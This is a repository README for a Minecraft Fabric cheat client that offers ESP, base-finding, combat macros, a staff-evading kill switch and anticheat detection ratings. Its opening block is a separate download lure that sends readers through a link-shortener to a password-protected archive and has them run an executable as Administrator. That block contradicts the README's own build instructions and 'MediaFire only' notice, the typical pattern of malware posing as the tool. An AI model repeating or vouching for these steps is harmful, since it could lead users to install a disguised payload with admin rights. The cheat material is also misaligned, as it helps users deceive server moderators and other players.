<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Breez Client

 Made With Claude.

A standalone Fabric client mod for Minecraft **1.21.11**: ESP, base-hunting tools, safety tooling, automation and macros.
It has its own module system, config, command prefix and click GUI. It does not depend on Meteor, Baritone or any other client.

> [!WARNING]
> **Ban risk.** Using a client like this breaks the rules of most multiplayer servers (DonutSMP included), and their anticheats and staff can detect it. You can be banned, temporarily or permanently, and lose your items and progress. Use it only where you are allowed to, at your own risk. The authors are not responsible for any bans or losses.

## Build and run

Needs **JDK 21**.

```
gradlew.bat build        # compiles, runs the unit tests, builds build/libs/breez-client-1.0.0.jar
gradlew.bat runClient    # development client
gradlew.bat test         # pure-logic unit tests only
```

Drop the jar from `build/libs` (not the `-sources` one) into `.minecraft/mods` together with Fabric API `0.141.6+1.21.11`.

## Using it

- **Right Shift** opens the click GUI: left click toggles a module, right click expands its settings, drag a slider to change numbers.
- **Chat commands** start with `.` and are never sent to the server. `.help` lists them.
- Bind any module to a key: `.bind <module> <key>` (`.bind storageesp g`, `.bind killswitch none`).
- Change any setting from chat: `.set <module> <setting> <value>`. List settings: `.set <module>`. Lists use `add`/`remove`:
  `.set killswitch trusted add MyAlt`.
- Config lives in `.minecraft/config/breez-client/`: `config.json` (modules), `profiles.json` (per-server staff list and seed),
  `macros.json`, `waypoints.json`, `killswitch.log`, and a `schematics/` folder.

## Modules

| Module | What it does |
|---|---|
| StorageESP | Boxes and tracers on chests, trapped chests, barrels, ender chests, shulkers, hoppers, furnaces and more. |
| SpawnerESP | Highlights spawners, optional chat notice and waypoint. |
| AmethystDetector | Finds amethyst clusters (and optionally buds / budding blocks that mark geodes). |
| BlockESP | ESP for any block ids you choose: `.blockesp add minecraft:diamond_ore`. |
| OreFinder | Scan-based ore ESP for what the server actually sent. Includes ancient debris. |
| SeedOres | Seed-based ore prediction for chunks the server hid behind anti-xray. `.seed <seed>`, enable SeedOres. |
| SusChunks | Finds player bases by specific signatures instead of a generic score: tight spawner stacks, spawners next to hoppers or redstone, hopper-fed storage, big storage rooms, ender chests, beacons and blocks of netherite/diamond/emerald. Villages, mineshafts, dungeons, strongholds, ancient cities, trial chambers, fortresses and bastions are recognized from their blocks and the weaker signatures are skipped around them. Also looks for concrete/glass/quartz building blocks, lit furnaces and campfires, packed animal pens, villager cells, armor stand and item frame walls, and (with TunnelFinder on) straight tunnels. Presets: SPAWNER_BASES (default), ALL_BASES, STORAGE, FARMS, CUSTOM; minimums, threshold and max highlights are settings. The old weighted scoring is still there as Mode WEIGHTED. Each flagged chunk is outlined (and tinted, "Fill chunk") as a whole, with a tighter box around the spot that triggered it; colour runs from green for the weakest find to red for the strongest on screen. `.sus` lists the top chunks with the reason. **Griefed bases:** it also flags bases that were wrecked or raided, which no longer have the storage and farms the other signatures need: places with signs that someone lived there (workstations, crafted building blocks, an ender chest, redstone) together with TNT left unlit, fire, obsidian piled on top, or workstations with every chest gone; and lavacasts (a lot of cobblestone standing tall above sea level). *Looking for: GRIEFED* shows only those. Flagged chunks that touch each other are ranked higher and labelled as one group, and **Outline the whole chunk** draws the chunk's border as a tall frame with a ring at your own height. |
| PlayerESP | Boxes, tracers, and through-walls nametags with health and distance. |
| Freecam | Detached camera. Your real player stands still and cannot attack or place. |
| Fullbright | Local night vision. |
| KillSwitch | Drops the connection immediately when listed staff, a spectator, or (optionally) any player comes within range. Logs to `killswitch.log`. |
| StaffList | `.staff add/remove/list/online/import <file>/clear`. Announces listed staff joining or leaving the tab list. You can also add names in the module's settings page (right click StaffList, "Staff names"), or in the Profiles tab. |
| AutoRelog | Leaves and rejoins when your Y level reaches the threshold (default -3) to reload chunks. Cooldown prevents loops. |
| AutoReconnect | Reconnects after the server drops you (not after you press Disconnect). Suppressed after a kill switch. |
| AntiAFK, AutoEat | Small irregular camera turns and hops; eats food from the hotbar when hungry. |
| CrystalMacro, TotemMacro | Places and breaks end crystals at your crosshair (on any face of obsidian or bedrock, laying an obsidian base first when needed); refills the offhand totem. |
| SpawnerPickup | Walks to each spawner, mines it with a silk touch pickaxe (looks away 90 degrees to the right mid-way, then looks back and finishes), then runs your home command and moves **only spawners** into your ender chest. Set the chest with `.spawner chest`. |
| SchematicBuilder | Builds `.litematic`, `.schem` and `.nbt` files (and Sponge files named `.schematic`; old MCEdit ones are refused with how to convert them) by hand, the way the schematic "printers" work: it keeps looking at every block of the build within reach, picks one that can be placed right now from where it stands (lowest layer first, the inside of a layer before its rim, then whatever needs the smallest turn of the head), looks at the nearest face it can click that no other block covers (the nearest spot of that face first) and places it. Orientation is checked by asking the block what a click at that spot would produce, so stairs, logs, slabs, hoppers and the like come out the right way round. When nothing in reach can be worked on, the pathfinder takes it to the nearest spot where something can (steps, drops, sprint jumps, and pillaring or bridging with a spare block that it takes down again at the end). On tall builds it **pearls up**: when all the work left is at least *Pearl when work is this high* (6) blocks above its feet, or there is no way up on foot at all, it picks flat ground on the build near the work, simulates the pearl's flight through the real blocks to find the pitch, throws an ender pearl from your inventory and carries on from where it lands (*Pearl up to high work*, on by default; needs more than 5 hearts in survival). Inside a layer it places corners first, so a ring of wall on top of a tower does not hide its own corners. It never shuts itself in, digs what is in the way, and re-checks the whole build before it says it is done. `.build auto [file]` loads and builds at your crosshair; also `.build files`, `.build load <file>`, `.build origin`, `.build start`. Files are found next to the mod jar, in `mods`, `config/breez-client/schematics`, `schematics` and `config/worldedit/schematics`, up to four subfolders deep; a file in a subfolder is named by its path, e.g. `.build load v2/house`. **Buy missing blocks** (off by default) opens the auction house, searches through the sign button for the block it ran out of and buys the cheapest listings, within *Max price per block*, optional per-block limits (`obsidian=2k`) and *Max total spend*. |
| AutoDig | Clears every block inside a box you mark with two corners (click *Mark corners with right-click* on its page or type `.dig mark`, then right-click the two blocks; those clicks place, open and send nothing. `.dig pos1`, `.dig pos2` and `.dig start` still work), working down from the top. Same idea as the builder: it digs whatever in reach it can see, nearest the crosshair first, aiming at the nearest uncovered face of each block, and the pathfinder takes it to the next spot when nothing is. Never breaks containers or spawners, leaves blocks next to lava, and reports what it left and why. Works with the DonutSMP shard pickaxe: a hotbar pickaxe whose name contains `shard` is treated as 3x3, used where its slab stays inside the box, and the rim is finished with an ordinary pickaxe. |
| Macros | `.macro add <name> <script>`; script steps: `say`, `wait`, `slot`, `use`, `attack`, `look`, `turn`, `sneak`, `jump`, `loop`. Bind with `.bind`. |

### Detection status

Every module has a rating, shown as a colored strip in the module list (green / amber / red, legend at the bottom of the
screen), as a line on its settings page, in its tooltip, and from chat with `.detection [undetected|risk|detected]`.

| Status | Meaning |
|---|---|
| **Undetected** | Local only (rendering, sounds, UI) or indistinguishable from ordinary play. |
| **Use at Risk** | Acts on its own in ways a strict anti-cheat or an attentive moderator can notice. |
| **Detected** | Known to be flagged by common anti-cheats. |

Modules are rated by what they send to the server. These are estimates of behavior, not guarantees: servers differ and change, so treat anything but the local-only
modules as something that can get you banned.

| Status | Modules |
|---|---|
| Detected | HitBox, TunnelBaseFinder |
| Use at Risk | TotemMacro (Auto Totem), AutoInvTotem, StaticHitBoxes, RTPBaseFinder, AntiTrap, ItemDropper, AutoSell, AutoSpawnerSell, SchematicBuilder, AutoDig, AutoShield, SpawnerPickup, ChestLooter, Baritone |
| Undetected | everything else |

### More modules

| Category | Module | What it does |
|---|---|---|
| Combat | AutoDoubleHand | At low health with a totem in the offhand, also holds a totem in the main hand. |
| Combat | AutoInvTotem | With the inventory open, moves a totem into the offhand (and an optional hotbar slot). |
| Combat | TotemOffhand | Hotbar totem to offhand with the swap-hands action, then back to your slot. |
| Combat | AutoJumpReset | Jumps on the tick you take a hit on the ground. |
| Combat | AutoShield | Raises a shield when an end crystal is within range, or a nearby player (not a friend) is holding crystals or a respawn anchor. Swaps a hotbar shield into the offhand with the swap-hands key, turns to face the danger (a shield only stops what comes from in front), blocks until it has been gone for a moment, then puts the offhand item and your slot back. An offhand totem stays put by default: the shield is held in the main hand instead. Stays out of the way while you hold crystals yourself. |
| Combat | NoHitDelay | Removes the 10-tick pause after swinging at nothing. |
| Combat | CrystalOptimizer | An end crystal you hit disappears on your screen at once, so the next place and hit do not wait for the server. |
| Combat | StaticHitBoxes | Your crosshair keeps seeing players at standing height while they sneak, crawl or swim. |
| Combat | SpearSwap | Switches to a spear (1.21.11) when you attack, then back. |
| Combat | AutoHitCrystal | Breaks any end crystal under the crosshair once in reach; never places. |
| Movement | Sprint | Holds sprint while moving forward. |
| Movement | ElytraGlide | Dive / climb pitch cycle that keeps speed and height without fireworks. |
| Misc | AutoFirework | Fires a rocket from hotbar or offhand while gliding when you slow down. |
| Misc | KeyPearl, KeyWindCharge | Bind to a key: throw an ender pearl / wind charge, then return to your slot. |
| Misc | AutoMine | Holds attack on blocks that are safe to break (never containers, spawners, unbreakables). |
| Misc | AutoTool | Fastest hotbar tool for the block you are breaking, restores your slot after. |
| Misc | Fakeplayer | A client-side copy of a player for testing ESPs; only you see it. |
| Donut | AutoSell, AutoSpawnerSell | Sell-window and spawner-window automation by window title and button name (all text is a setting). |
| Donut | ChunkFinder | Chunks holding at least N of the blocks you pick. `.chunkfinder` lists them. |
| Donut | NetheriteFinder | Ancient debris and netherite blocks. |
| Donut | PlayerChunks | Chunks other players were seen in, fading with age. |
| Donut | ItemDropper | Drops listed items (or everything not on the Keep list) at a steady pace. |
| Donut | AntiTrap | Digs out when you are walled into a 1x2 cell. |
| BaseFinding | BlockEntityDebug | HUD panel and chat list of block entities by type for your chunk(s). |
| BaseFinding | LightFinder | Player-placed torches, lanterns and lamps deep underground. |
| BaseFinding | SuspiciousESP | Individual blocks natural generation does not make (obsidian, hoppers, observers, beacons...). |
| BaseFinding | TunnelBaseFinder | Joins TunnelFinder runs into whole tunnels and marks both ends. |
| BaseFinding | PrimeChunkFinder | Chunks where several finders agree (base signature, stash, tunnel, old chunk in new terrain). `.prime` lists them. |
| BaseFinding | RTPBaseFinder | Repeats your `/rtp` command, checks the finders after each landing, stops on a find. |
| BaseFinding | SeedChunkFinder | With the seed set, chunks where most of the generated ore is gone (mined out). It works out where ore was generated as if the dug-out spaces were still rock, so chunks mined before you got there are found too. |
| Render | BlockNotifier | Pop-up (and chime) when a listed block appears in range. |
| Render | PearlTrajectory | Landing prediction for the pearl in your hand and for pearls in flight. |
| Render | BowTrajectory | Where your arrow or trident will hit (bow, loaded crossbow, trident), with the entity it would hit outlined; optionally arrows already in flight. |
| Render | RealHitBox | Draws the true hitbox the server uses. |
| Render | TargetHUD, MusicHUD | Target panel (name, health, armor, distance) and a "now playing" line. |
| Client | DiscordPresence | Rich presence through the local Discord app. Needs an Application ID (empty = nothing is sent). |
| Client | Proxy | SOCKS5 / SOCKS4 / HTTP proxy for the server connection (host, port and optional login in the settings). |
| Client | Radio | MP3 internet radio (Radio Paradise, ILoveRadio, FIP, or your own stream URL). |

Already present under other names: Auto Crystal = CrystalMacro, Auto Totem = TotemMacro, Auto Loot = ChestLooter, Cord Snapper =
CoordSnapper, Fast Place = FastUse, Ore Sim = SeedOres, SwingSpeed = Animations (Swing speed), Chat Macro = the Macros tab,
HUD = the HUD tab, Trigger Bot = Triggerbot.

Things you fill in yourself (nothing is sent until you do): DiscordPresence needs the Application ID of an app you create at
discord.com/developers/applications; Proxy needs a host, port and optional username and password; Radio's CUSTOM station needs
a stream URL.

Notes on the network modules: Proxy keeps its login in `config.json` as plain text, and while it is switched on without a
host, server connections are refused rather than sent directly. Minecraft resolves the server's DNS name before the relay
sees it, so the lookup itself is not proxied. Radio bundles the LGPL-licensed JLayer MP3 decoder (`javazoom:jlayer`).

### The GUI (Right Shift)

Meteor-style: a tab bar (Modules, Config, GUI, Macros, Profiles, Waypoints, HUD) over draggable, scrollable windows with soft shadows,
gradient headers and eased hover, toggle, collapse and open animations. The category windows lay themselves out in a grid that fills
the screen and never overlap; each header shows how many of its modules are on.
Left click a module toggles it, right click opens its settings page (grouped, collapsible sections, tooltips, per-setting reset,
color picker, list editors with block/item search, key bind, hold-to-enable); the three dots on a hovered module open it too.
Just start typing to search (or `Ctrl+F`); categories with no match hide, `Esc` clears the search.
- **GUI tab:** color presets (Breez, Ocean, Mint, Sunset, Rose, Mono), accent/text/background colors, window shadows, opacity, scale, rounded corners, animation speed, HUD module-list side, toast settings, reset layout.
- **Actions in the module pages:** everything that used to need a typed command is a button or field in an "Actions" section of the module it belongs to
  (right click the module): spawner chest, schematic load/origin, seed verify/clear, chunk/stash/geode/sus/coverage stats, export and clear, staff import,
  player lookup, and the pathing tasks (go to, mine, follow, tunnel, this way, stop, pause, resume). The buttons run the same commands, so chat still works.
- **Pickers instead of typing:** every block, item and entity list has a "+ Add" picker: a category button, a search box and a scrollable list of everything
  that can be added; click an entry to add it, click again to remove it. Staff, friends and trusted lists offer the players online right now.
- **Friends:** `.friend add|remove|list` (green in PlayerESP/NameTags, never trigger KillSwitch); also editable in the Config tab.
- **Config tab:** command prefix, humanization delay scale, camera turn speed, announce-all-toggles, "Alerts in chat" (off by default: finds show as merged pop-ups instead of filling chat).
- **Profiles tab:** per-server world seed and staff list. **Macros tab:** create, edit, bind, run macros. **HUD tab:** drag HUD elements.
- Toasts (pop-ups) replace chat spam; every module can announce toggles with its own "Chat feedback" switch.
The look and layout are modelled on Meteor Client's, but all code here is original (Meteor is GPL-3.0).

### More modules

| Module | What it does |
|---|---|
| AmethystDetector | Groups budding amethyst into geodes, measures how grown their crystals are (small/medium/large/cluster), shows `Geode 94% grown` labels with an age estimate, and sends a **toast when a geode reaches the threshold** (default 90% of growing crystals are full clusters). `.geodes` lists them. |
| ClusterESP | Marks the open slots next to budding amethyst, i.e. geodes that are not finished. |
| NewChunks / TrailFinder | Detects new vs old chunks (fluid flow right after load), draws them, shows a chunk minimap on the HUD, saves them per server and dimension (`.chunks stats|export|clear`), and points to old-chunk trail heads next to unexplored chunks. |
| StashFinder | Scores chunks by preset (storage, redstone, decoration, spawners), skips natural dungeons, toasts and logs each find to `stashes.csv`. `.stash list|export|clear`. |
| BlockEntityESP / EntityStorageESP | Chests, spawners, signs (with text), beds and more straight from chunk data; chest boats and minecarts, pack animals with chests, item frames, armor stands. |
| PortalESP, HoleESP, MobESP, SpawnerNametags, WeatherNotifier, CoordSnapper | Portals; 1x1 holes (green = bedrock/obsidian); mobs; spawner type + 16-block ring; rain/storm toasts; copy looked-at coordinates. |
| SpawnerProtect | A stranger comes close: picks up nearby spawners, then leaves the server. |
| Baritone | Built-in pathing: `.goto <x y z \| x z \| waypoint \| player>`, `.mine <block...> [n]`, `.follow <player>`, `.explore`, `.tunnel [n] [dir]`, `.thisway [n]`, `.surface`, `.stop/.pause/.resume`. Walks, sprint-jumps gaps, breaks through blocks, digs down, pillars and bridges with your cheap blocks; never breaks containers, spawners or anything on its protected list. |
| AutoWalk, AutoClicker, AutoTPA, FastUse, FreeLook, Zoom, CustomFOV, CustomCrosshair, JumpCircles, HitParticles, NameProtect, SkinProtect | Utility and visual modules. |
| AutoMessage | Types a custom chat message (or command) after you kill someone or die, with a delay you choose; {player}, {killer} and random picks from a `\|`-separated list. |
| AimAssist, Triggerbot, HoverTotem, AnchorMacro, DoubleAnchor, MaceSwap, MaceBomber, ShieldBreaker, ElytraSwap | Combat helpers. Every attack goes through one safety gate that refuses targets a vanilla server kicks you for (yourself, items, XP orbs, arrows). |

| ArmorTrimHider, CustomGlint, MotionBlur, Animations | Render-only changes you see locally: hide or randomize armor trims, recolor the enchant glint (rainbow option), frame-blend motion blur (strength 1-5), steadier first-person hands (no equip/cooldown dip, swing speed, hand offset and size). |
| TunnelFinder | Long straight 1x2 corridors underground (strip mines and dug hallways), scanned a few chunks per second; the chunks around you are read again every minute, so tunnels dug while you are there show up; also adds a "Straight tunnel" signature to SusChunks. |
| CoverageMap | HUD map of chunks you have already had loaded per server and dimension; `.coverage stats\|export\|clear`. |
| AutoLog | Disconnects at low health, after N totem pops within 60 s, or in lava; auto-reconnect stays off unless you allow it. |
| AlertWebhook | Posts finds, KillSwitch/AutoLog events and disconnects to a Discord webhook URL you set (Discord addresses only; the URL is a secret). |
| ItemESP | Dropped valuables (spawners, shulker boxes, netherite and more) from a list with `*` wildcards. |
| ChestLooter | Shift-clicks listed items out of a container you opened by hand, humanized. It only works on menus opened from a real container block, never on server shop or menu screens. |
| PlayerLogger | Join/leave log to `players.csv` and last-seen positions: `.players [name]`. |
| ScoreboardName | Replaces your own name with any text (with `&` color codes), or hides your sidebar line. Covers the sidebar line text, score text and title (custom stat boards), the tab list, and chat/action bar lines. Local display only; scores and numbers are never changed. |
| NameTags | HUD-styled tags with health bar, distance and gear for players, names and counts for dropped items, visible through walls; can hide the vanilla tag. |
| HitBox | Your crosshair treats other entities as a bit wider (default +0.15). The server still uses the real hitbox and its own reach check, so large values just produce rejected hits. |
| CreamyKeys | Synthesized keyboard, mouse and scroll "thock" sounds, played outside Minecraft's sound engine. |
| CustomAccessories | Your own cape (4 patterns, 2 colors; also on your elytra), particle trail, aura and crown. Only you see them. |
| RegionMap | HUD map of regions you define (`name x1 z1 x2 z2`), with an alert when you enter another region. It ships empty: the regions of a specific server are yours to enter. |

CrystalMacro can now lay an obsidian base first: aim at the top of a block that is not obsidian or bedrock and it places obsidian from your hotbar, then switches back to crystals.

Not built on purpose: FakePay, FakeStats and GambleRigger. Those only fake payments and balances or rig gambles against other players, so they are not part of this client.

Waypoints: `.waypoints list|add|remove|clear`. Finds from SpawnerESP, AmethystDetector and SusChunks can save waypoints automatically.

## About "undetectable"

The Detection ratings above are estimates. Nothing here sends custom packets or changes the client brand, and every automated action goes through a humanization layer:
camera moves are eased and snapped to real mouse-step sizes, and clicks and placements use randomized, non-periodic delays.
That makes automation look less robotic. It does **not** make it undetectable: server anti-cheat varies, staff can watch you,
and ESP, freecam and fullbright are only invisible because they are local. Treat everything as detectable.

## Known limits

- SeedOres reuses the game's own feature sorter, placement modifiers and ore configs, and ports the two ore placement
  algorithms. Measured against a real generated world (seed-matched singleplayer, 300+ chunks): ancient debris 100% precision /
  99% recall, quartz and nether gold 99-100%, diamond 99% / 98%, gold 98% / 97%, redstone 100% / 98%, lapis 98% / 96%,
  iron 97% / 88%, copper 74% / 63% (the large noise-based copper and iron veins are not modelled), coal about 57% (coal veins
  are huge and numerous, so one mis-modelled block shifts the random stream for the rest of that feature). It only knows about
  chunks the server has sent you, and it needs the real seed. Check it yourself in singleplayer with `.seed verify`.
- Not verified against a live multiplayer server: KillSwitch, AutoRelog, AutoReconnect, SpawnerPickup, SchematicBuilder and the
  macro engine compile and are wired in, but only the parts with unit tests (pathfinder, schematic parsers, macro parser,
  scoring, rotations) were exercised automatically. Try them on a test world before relying on them.
- Dev self-test: set the `BREEZ_SELFTEST` environment variable and launch with `--quickPlaySingleplayer <world>`; it enables the
  passive modules, checks SeedOres against the world and writes `run/breez-selftest.txt`.
- SchematicBuilder gets the orientation right for anything a player decides by where they stand and what they click (facing, axis, top or bottom half, hopper direction, wall or floor attachment). What it cannot place the right way round from any spot it can reach is placed anyway and counted as "may need turning" (or left out with *Exact orientation only*). Sign and banner rotation in sixteenths is not attempted. The placing logic follows the approach of kkllffaa's meteor-litematica-printer (GPL-3.0); the code here is written from scratch.
- Automated camera turns move every frame with an ease-in, a steady middle whose speed is drawn fresh for each turn, and an ease-out. *Camera turn speed* in the Config tab scales all of them.
- SchematicBuilder's auction buying and AutoDig's 3x3 pickaxe handling were written from how DonutSMP is described, not tested on
  the live server (there is no way to do that from a test world). The buyer only clicks a listing whose price it could read from
  the tooltip, counts money as spent the moment it presses confirm, and stops buying for the rest of the build the first time a
  window is not what it expects. Try it with a low *Max total spend* first, and adjust the button names in its settings if the
  server words them differently. AutoDig assumes the 3x3 slab lies across the face you hit.
- Kill switch cannot see staff who are vanished by a plugin (they never reach your client).
- Rendering was written against the 1.21.11 render pipeline; if a future Minecraft version changes it, `render/BreezRender.java` is the file to look at.

## License

MIT (see LICENSE).


---

MIT License

Copyright (c) 2026 noahp0582

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
